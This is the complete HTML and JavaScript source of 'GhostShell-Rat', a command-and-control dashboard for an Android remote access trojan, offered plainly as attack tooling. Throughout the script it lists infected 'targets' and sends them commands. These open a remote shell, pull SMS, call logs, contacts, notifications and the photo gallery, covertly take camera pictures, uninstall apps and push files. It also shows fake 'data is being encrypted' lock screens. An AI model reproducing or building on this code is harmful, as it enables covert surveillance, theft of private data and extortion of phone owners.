<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GhostShell Dashboard</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI', system-ui; }
        :root { --bg:#0b0f0e; --surface:#141a1a; --primary:#00ffc3; --secondary:#ff3b9e; --text:#dbdbdb; --dim:#8fadad; }
        body { background:var(--bg); color:var(--text); padding:10px; overflow-x:hidden; }
        .app-container { max-width:1200px; margin:0 auto; display:grid; grid-template-columns:300px 1fr; gap:15px; }
        .panel { background:var(--surface); border:1px solid var(--primary); border-radius:20px; padding:15px; box-shadow:0 0 15px rgba(0,255,195,0.1); }
        .header { grid-column:1/-1; display:flex; justify-content:space-between; align-items:center; }
        .device-item { background:#1b2626; padding:15px; border-radius:15px; margin-bottom:10px; cursor:pointer; border:1px solid transparent; transition:0.3s; line-height:1.4; }
        .device-item.active { border-color:var(--secondary); box-shadow:0 0 10px var(--secondary); background:#253232; }
        .status-bar { display:flex; justify-content:space-between; background:#0f1818; padding:10px 15px; border-radius:30px; margin-bottom:15px; border:1px solid #222; font-size:0.9rem; }
        .grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(110px, 1fr)); gap:10px; }
        .btn { background:#1b2828; border:1px solid #2f4040; border-radius:18px; padding:15px 5px; text-align:center; color:var(--primary); cursor:pointer; font-size:0.8rem; }
        .btn i { display:block; font-size:1.8rem; margin-bottom:8px; color:var(--secondary); }
        .btn:hover { border-color:var(--primary); box-shadow:0 0 15px var(--primary); }
        .btn.active { border-color:var(--secondary); color:var(--secondary); box-shadow:0 0 15px var(--secondary); }
        .modal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.9); z-index:100; align-items:center; justify-content:center; padding:15px; }
        .modal-card { background:var(--surface); width:100%; max-width:850px; max-height:90vh; border-radius:25px; border:1px solid var(--primary); display:flex; flex-direction:column; overflow:hidden; }
        .modal-body { padding:15px; overflow-y:auto; flex:1; background:#121d1d; font-size:0.9rem; }
        .modal-footer { padding:12px; background:#0c1616; display:flex; gap:8px; flex-wrap:wrap; border-top:1px solid #222; }
        table { width:100%; border-collapse:collapse; }
        th { color:var(--primary); border-bottom:1px solid #333; padding:8px; text-align:left; }
        td { padding:8px; border-bottom:1px solid #1a2525; color:#ccc; }
        input, textarea { background:#1e2e2e; border:1px solid #3b5e5e; padding:12px 15px; border-radius:15px; color:#fff; width:100%; }
        button { background:var(--primary); color:#000; font-weight:bold; border:none; padding:8px 15px; border-radius:20px; cursor:pointer; }
        .red-btn { background:var(--secondary); color:#fff; }
        .terminal { background:#050505; color:#00ff00; font-family:'Courier New', monospace; padding:15px; border-radius:10px; height:350px; overflow-y:auto; border:1px solid #333; margin-bottom:10px; white-space:pre-wrap; }
        .gal-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(120px, 1fr)); gap:10px; }
        .gal-item img { width:100%; height:100px; object-fit:cover; border-radius:10px; border:1px solid var(--primary); }
        @media (max-width:700px) { .app-container { grid-template-columns:1fr; } }
    </style>
</head>
<body>
    <div class="app-container">
        <header class="panel header">
            <h1 style="font-size:1.5rem; color:var(--primary);"><i class="fas fa-skull"></i> GhostShell-Rat</h1>
            <div style="display:flex; align-items:center; gap:15px;">
                <div style="color:var(--secondary); font-size:1rem;"><i class="fas fa-user-secret"></i> <span id="user-display"></span></div>
                <button onclick="logout()" style="background:#222; font-size:0.7rem; padding:5px 10px; border:1px solid var(--secondary); color:var(--secondary)">LOGOUT</button>
            </div>
        </header>
        <div class="panel">
            <h3 style="color:var(--secondary); margin-bottom:15px;"><i class="fas fa-satellite"></i> YOUR TARGETS</h3>
            <div id="device-list">Scanning...</div>
        </div>
        <div class="panel">
            <div class="status-bar">
                <span>ðŸŽ¯ Target: <b id="sel-info" style="color:var(--primary)">None</b></span>
                <span>ðŸ“¶ Status: <b id="conn-stat" style="color:red">OFFLINE</b></span>
            </div>
            <div class="grid" id="main-grid"></div>
        </div>
    </div>

    <div id="modal" class="modal">
        <div class="modal-card">
            <div class="modal-header" style="padding:15px; background:#101b1b; display:flex; justify-content:space-between; align-items:center;">
                <h3 id="modal-title" style="color:var(--secondary)">MODAL</h3>
                <span style="cursor:pointer; font-size:1.5rem;" onclick="closeModal()">&times;</span>
            </div>
            <div class="modal-body" id="modal-body"></div>
            <div class="modal-footer" id="modal-footer"></div>
        </div>
    </div>

    <script>
        const myUid = localStorage.getItem('ghost_uid');
        if(!myUid) location.href = '/';
        document.getElementById('user-display').innerText = myUid;

        let state = { devices: [] }, selId = null, curMod = null, cache = {}, hash = "", termOut = "", flash = false, mediaRecorder, audioChunks = [];

        async function cmd(c, b={}) {
            if(!selId) return;
            await fetch('/api/command', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({cmd:c, client_id:selId, ...b})});
        }

        function logout() { localStorage.removeItem('ghost_uid'); location.href = '/'; }

        function openModal(t) {
            curMod = t; hash = "";
            document.getElementById('modal').style.display = 'flex';
            document.getElementById('modal-title').innerText = t.toUpperCase();
            const b = document.getElementById('modal-body'), f = document.getElementById('modal-footer');
            b.innerHTML = ""; f.innerHTML = "";

            if(t === 'filemanager') {
                termOut = "ghost@android:~# Remote Shell Active.\n";
                b.innerHTML = `<div class="terminal" id="terminal">${termOut}</div><div style="display:flex; gap:10px; background:#000; padding:10px; border-radius:10px;"><span style="color:var(--secondary)">#</span><input id="term-in" style="background:transparent; border:none; color:#fff; outline:none; width:100%" autofocus onkeydown="if(event.key==='Enter') execShell()"></div>`;
                f.innerHTML = `<button onclick="document.getElementById('up-file').click()">+ UPLOAD</button><input type="file" id="up-file" style="display:none" onchange="uploadShellFile(this)">`;
                cmd('filemanager'); return;
            } else if(t === 'panic') {
                b.innerHTML = `<p>Duration:</p><input type="number" id="psec" value="30"><p style="margin-top:10px;">Hell Message:</p><textarea id="pmsg">YOU ARE HACKED!</textarea>`;
                f.innerHTML = `<button class="red-btn" style="width:100%" onclick="cmd('panic '+document.getElementById('psec').value+'|'+document.getElementById('pmsg').value.replace(/\\n/g,'<br>'))">START HELL</button><button onclick="cmd('stop_panic')">STOP</button>`;
                return;
            } else if(t === 'voice') {
                b.innerHTML = `<div style="text-align:center; padding:20px;"><i id="v-icon" class="fas fa-microphone" style="font-size:3rem;"></i><p id="v-stat">Ready...</p></div>`;
                f.innerHTML = `<button id="v-start" onclick="startRec()">START</button><button id="v-stop" onclick="stopRec()" style="display:none" class="red-btn">STOP & SEND</button>`;
                return;
            } else if(t === 'setwallpaper') {
                b.innerHTML = `<p>Upload:</p><input type="file" onchange="uploadWall(this)"><p style="margin-top:10px;">URL:</p><input id="wurl" placeholder="https://domain.com/img.jpg">`;
                f.innerHTML = `<button onclick="cmd('set_wallpaper '+document.getElementById('wurl').value)">APPLY</button>`;
                return;
            } else if(t === 'toast') {
                b.innerHTML = `<p>System Message:</p><textarea id="lmsg" style="height:100px;">SYSTEM CRITICAL ERROR\\nYour data is being encrypted.</textarea><p style="margin-top:15px;">Unlock PIN:</p><input id="lpin" value="1337" style="text-align:center; font-size:1.2rem; font-family:monospace;">`;
                f.innerHTML = `<button class="red-btn" style="width:100%" onclick="cmd('lock '+document.getElementById('lmsg').value.replace(/\\n/g, '<br>')+'|'+document.getElementById('lpin').value)">LOCK DEVICE</button><button onclick="cmd('unlock')">UNLOCK</button>`;
                return;
            } else if(t === 'vibrate') {
                b.innerHTML = `<p>Duration (Seconds):</p><input type="number" id="vsec" value="5">`;
                f.innerHTML = `<button onclick="cmd('vibrate '+document.getElementById('vsec').value)">START VIBRATE</button>`;
                return;
            } else if(t === 'open_url') {
                b.innerHTML = `<p>Target Link:</p><input id="ourl" value="https://google.com">`;
                f.innerHTML = `<button onclick="cmd('openurl '+document.getElementById('ourl').value)">OPEN</button>`;
                return;
            }

            const map = { sms:'getsms', calls:'getcalllogs', apps:'list_app', notifications:'getnotifications', takebackpic:'takebackpic', takefrontpic:'takefrontpic', contacts:'getcontacts', info:'deviceinfo', gallery:'gallery' };
            if(map[t]) cmd(map[t]);
            render();
        }

        function execShell() {
            const inp = document.getElementById('term-in'); if(!inp.value.trim()) return;
            cmd(inp.value.trim()); termOut += `# ${inp.value}\n`;
            document.getElementById('terminal').innerText = termOut; inp.value = "";
        }

        async function startRec() {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            mediaRecorder = new MediaRecorder(stream); audioChunks = [];
            mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
            mediaRecorder.onstop = sendAudio; mediaRecorder.start();
            document.getElementById('v-icon').style.color = 'red'; document.getElementById('v-stat').innerText = 'Recording...';
            document.getElementById('v-start').style.display = 'none'; document.getElementById('v-stop').style.display = 'inline-block';
        }
        function stopRec() { mediaRecorder.stop(); }
        async function sendAudio() {
            const audioBlob = new Blob(audioChunks, { type: 'audio/mpeg' });
            const formData = new FormData(); formData.append('file', audioBlob);
            const res = await fetch('/api/upload_voice', { method: 'POST', body: formData });
            const data = await res.json();
            if(data.status === 'ok') cmd('play_voice ' + window.location.origin + '/captured_images/' + data.filename);
            setTimeout(closeModal, 1500);
        }

        async function uploadWall(input) {
            const formData = new FormData(); formData.append('file', input.files[0]);
            const res = await fetch('/api/upload_wallpaper', {method:'POST', body:formData});
            const data = await res.json();
            if(data.status === 'ok') cmd('set_wallpaper ' + window.location.origin + '/captured_images/' + data.filename);
        }

        async function uploadShellFile(input) {
            const formData = new FormData(); formData.append('file', input.files[0]);
            const res = await fetch('/api/upload_wallpaper', {method:'POST', body:formData});
            const data = await res.json();
            if(data.status === 'ok') cmd(`upload ${btoa(data.filename)} ${btoa(window.location.origin + '/captured_images/' + data.filename)}`);
        }

        function closeModal() { if(curMod === 'gallery') cmd('exit_gallery'); if(curMod === 'filemanager') cmd('exit_shell'); document.getElementById('modal').style.display = 'none'; curMod = null; }

        function render() {
            if(!curMod || !selId || !cache[selId]) return;
            const d = cache[selId], b = document.getElementById('modal-body'), f = document.getElementById('modal-footer');
            if(curMod === 'filemanager') {
                const fm = d.fm; if(hash === JSON.stringify(fm)) return; hash = JSON.stringify(fm);
                let out = `Path: ${fm.path}\n\n`;
                fm.files.forEach(x => out += `${x.isDirectory?'[DIR] ':'[FILE]'} ${x.name}\n`);
                termOut += out; document.getElementById('terminal').innerText = termOut;
                document.getElementById('terminal').scrollTop = document.getElementById('terminal').scrollHeight; return;
            }
            if(['panic', 'vibrate', 'open_url', 'setwallpaper', 'voice', 'toast'].includes(curMod)) return;
            const curHash = JSON.stringify(d[curMod] || d.info || d.media || d.notifications || "");
            if(hash === curHash) return; hash = curHash;
            b.innerHTML = "";

            if(curMod === 'info') {
                const i = d.info;
                b.innerHTML = `<table><tr><td>Model</td><td>${i.Model}</td></tr><tr><td>Manufacturer</td><td>${i.Manufacturer}</td></tr><tr><td>Android</td><td>${i.AndroidVersion}</td></tr><tr><td>Country</td><td>${i.Country}</td></tr><tr><td>Battery</td><td>${i.Battery}</td></tr><tr><td>WiFi</td><td>${i.WiFi}</td></tr><tr><td>SIM 1</td><td>${i.SIM1 || 'N/A'}</td></tr><tr><td>SIM 2</td><td>${i.SIM2 || 'N/A'}</td></tr><tr><td>Number</td><td>${i.PhoneNumber}</td></tr></table>`;
            } else if(curMod === 'apps') {
                b.innerHTML = `<table><tr><th>App</th><th>Action</th></tr>${d.apps.map(a=>`<tr><td>${a.appName}<br><small>${a.packageName}</small></td><td><button onclick="cmd('run ${a.packageName}')">RUN</button> <button class="red-btn" onclick="cmd('uninstall ${a.packageName}')">X</button></td></tr>`).join('')}</table>`;
            } else if(curMod === 'sms') {
                b.innerHTML = `<table><tr><th>Sender</th><th>Text</th></tr>${d.sms.map(l=>`<tr><td>${l.userSender}</td><td>${l.content}</td></tr>`).join('')}</table>`;
            } else if(curMod === 'calls') {
                b.innerHTML = `<table><tr><th>Number</th><th>Dur</th></tr>${d.calls.map(l=>`<tr><td>${l.number}</td><td>${l.duration_seconds}s</td></tr>`).join('')}</table>`;
            } else if(curMod === 'contacts') {
                b.innerHTML = `<table><tr><th>Name</th><th>Number</th></tr>${d.contacts.map(c=>`<tr><td>${c.name}</td><td>${c.number}</td></tr>`).join('')}</table>`;
            } else if(curMod === 'gallery') {
                b.innerHTML = `<div class="gal-grid">${d.gallery.files.map(x=>`<div class="gal-item"><img src="data:image/jpeg;base64,${x.thumbnail}"/><p style="font-size:0.5rem">${x.name}</p></div>`).join('')}</div>`;
                f.innerHTML = `<button onclick="cmd('gallery back')">PREV</button><span style="color:var(--primary)">PAGE ${d.gallery.page}</span><button onclick="cmd('gallery next')">NEXT</button>`;
            } else if(curMod.includes('pic')) {
                b.innerHTML = `<div style="text-align:center;"><img src="${d.media.is_direct?'data:image/jpeg;base64,'+d.media.last_img:'/captured_images/'+d.media.last_img}" style="width:100%; border-radius:15px; border:1px solid var(--primary);"></div>`;
            } else if(curMod === 'notifications') {
                b.innerHTML = `<table><tr><th>App</th><th>Message</th></tr>${d.notifications.map(n=>`<tr><td>${n.packageName}</td><td><b>${n.title}</b>: ${n.text}</td></tr>`).join('')}</table>`;
                f.innerHTML = `<button onclick="cmd('getnotifications')">REFRESH</button>`;
            }
        }

        async function poll() {
            try {
                const res = await fetch(`/api/status?owner=${myUid}`);
                state = await res.json();
                document.getElementById('device-list').innerHTML = state.devices.map(d=>`<div class="device-item ${selId===d.id?'active':''}" onclick="selId='${d.id}'; updateMain();"><b style="color:var(--primary)">${d.model}</b> (${d.man})<br><small style="color:var(--dim)">Android ${d.ver} | ${d.cnt}</small><br><small style="color:var(--secondary)">BAT: ${d.bat}</small></div>`).join('') || "No target online.";
                if(selId) {
                    const dres = await fetch(`/api/data/${selId}`);
                    cache[selId] = await dres.json(); if(curMod) render();
                }
            } catch(e){}
            setTimeout(poll, 3000);
        }

        function toggleFlash(btn) { flash = !flash; cmd(flash?'flashon':'flashoff'); btn.classList.toggle('active'); }

        function updateMain() {
            document.getElementById('sel-info').innerText = selId || "None";
            const e = !!selId;
            document.getElementById('conn-stat').innerText = e ? "ONLINE":"OFFLINE";
            document.getElementById('conn-stat').style.color = e ? "#00ffc3":"#ff3b9e";
            const btns = [
                {id:'filemanager', i:'fa-terminal', l:'REMOTE SHELL'}, {id:'info', i:'fa-circle-info', l:'FULL INFO'},
                {id:'panic', i:'fa-triangle-exclamation', l:'HELL LOCK'}, {id:'contacts', i:'fa-address-book', l:'CONTACTS'},
                {id:'sms', i:'fa-sms', l:'SMS'}, {id:'calls', i:'fa-phone', l:'CALLS'},
                {id:'gallery', i:'fa-images', l:'GALLERY'}, {id:'notifications', i:'fa-bell', l:'NOTIFS'},
                {id:'apps', i:'fa-th', l:'APPS'}, {id:'flash', i:'fa-bolt', l:'FLASH'},
                {id:'vibrate', i:'fa-mobile-vibration', l:'VIBRATE'}, {id:'voice', i:'fa-microphone', l:'SEND VOICE'},
                {id:'takebackpic', i:'fa-camera', l:'CAM BACK'}, {id:'takefrontpic', i:'fa-video', l:'CAM FRONT'},
                {id:'setwallpaper', i:'fa-image', l:'WALLPAPER'}, {id:'toast', i:'fa-lock', l:'SYSTEM LOCK'},
                {id:'open_url', i:'fa-globe', l:'OPEN URL'}
            ];
            document.getElementById('main-grid').innerHTML = btns.map(b=>`<div class="btn ${b.id==='flash'&&flash?'active':''}" onclick="${b.id==='flash'?'toggleFlash(this)':'openModal(\''+b.id+'\')'}"><i class="fas ${b.i}"></i>${b.l}</div>`).join('');
        }
        poll();
    </script>
</body>
</html>
